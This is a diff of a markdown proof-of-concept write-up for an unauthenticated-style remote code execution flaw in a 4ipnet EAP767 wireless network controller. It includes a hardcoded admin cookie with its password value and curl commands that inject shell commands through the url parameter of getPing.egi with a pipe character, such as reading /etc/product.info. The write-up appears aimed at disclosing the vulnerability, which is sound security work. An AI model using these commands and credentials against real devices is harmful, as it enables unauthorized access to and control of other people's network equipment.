@@ -1,31 +1,30 @@
 # RCE PoC for 4ipnet/EAP767 device
 
-The login web page is found , and it's used for 4ipnet wireless network controller
+The login web page is exposed to internet, and it's used for 4ipnet wireless network controller
+> Search online documents to obtain the default password for the device.
+
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_247c7496749603bc7b9772d11afd7ba4.png)
-
-
-**Search online articles to obtain the default password for the device.**
 
 **Web console features**
 
-Overview
+System Overview
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_fa6cb02d32f831033c013c4142586a4f.png)
 
-The management interface has the Home > Utilities > Network Utilities feature, allowing network tests such as ping, tracert, arping, etc., to be performed through the web page
+Network Utilities feature: `allowing network tests such as ping, tracert, arping, etc., to be performed through the web page.`
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_9925e6bd58df1d54d022f404504adbef.png)
 
-## Exploit PoC
-**PoC I @ Browser**
+## Exploit
+**Phase I @ Browser**
 
 The front-end performs input text validation to check whether the input text is compliant
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_0d41715f59b4037ce1b9dcea6c9d31ce.png)
 
-Turn to the backend, verify HTTP request characteristics from the network
+Turn to the backend, analysis HTTP request characteristics from the network
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_b87e4fa1fea137d1feba67001f4ca104.png)
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_354d5ac2dd8284e800fa818cf166f489.png)
 
 
-http request characteristics
+We gather two http request characteristics.
 ```asp!
 # request 1
 http://{host}/getPing.egi?url=127.0.0.1
@@ -36,18 +35,17 @@ http://{host}/getPing.egi?pid=940
 > It can be observed that its ping function first sends the url as a query string parameter, obtains the pid, then retrieves ping output in batches through the pid parameter, and finally presents the results on the web page
 
 It was found that the management interface relies solely on the cookie name/value as the basis for user identification
+> Using the same set of credentials (admin), regardless of how many times you log in, the content of the cookie remains unchanged.
+
 | Name | Value |
 | -------- | -------- |
 | username     | admin    |
 | password     |  17lgP6vqCV1Ko   |
 
-:::danger
-Using the same set of credentials (admin), regardless of how many times you log in, the content of the cookie remains unchanged:::
-
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_3ecdb0b545bf10be16816293036534e8.png)
 
 
-**PoC II @ cmd**
+**Phase II @ cmd**
 
 Using the curl tool to simulate an HTTP request to access the management interface home page, it was redirected to the login page
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_f3925ef9b1edaae1b762ad800322d80d.png)
@@ -55,7 +53,8 @@ Using the curl tool to simulate an HTTP request to access the management interfa
 Using the curl tool to simulate an HTTP request and including the aforementioned obtained cookie, it was confirmed that access to the authenticated management interface home page is possible
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_a76b368249757b325d6f3bcc4ab24d88.png)
 
-Attempted to access the `getPing.egi` page and escape the query string parameter url using special characters (;, |) in an attempt to evade security and inject a specified command
+Attempted to access the `getPing.egi` file and escape the query string parameter url using special characters (;, |) in an attempt to evade security and inject a specified command
+
 **Attemp I with `;`**
 Detected as invalid characters by the backend program.
 ```zsh!
@@ -106,7 +105,7 @@ Inject Target with `ls -l` to display the current directory structure, file perm
 
 
 
-## Verify the device brand and model.
+## Verify the device product and model.
 ```zsh!
 curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
 ```
@@ -116,6 +115,6 @@ curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20
 The presence of a Remote Code Execution (RCE) vulnerability is in the product. Arbitrary commands can be executed by passing the url parameter.
 
 ## Reference
-https://hkitblog.com/12770/
-https://www.lienshen.com.tw/sidebar1_01-2-11.html
-https://www.netadmin.com.tw/netadmin/zh-tw/snapshot/0E91A5D929C04C40AB6A6B88592725E1
+- https://hkitblog.com/12770/
+- https://www.lienshen.com.tw/sidebar1_01-2-11.html
+- https://www.netadmin.com.tw/netadmin/zh-tw/snapshot/0E91A5D929C04C40AB6A6B88592725E1
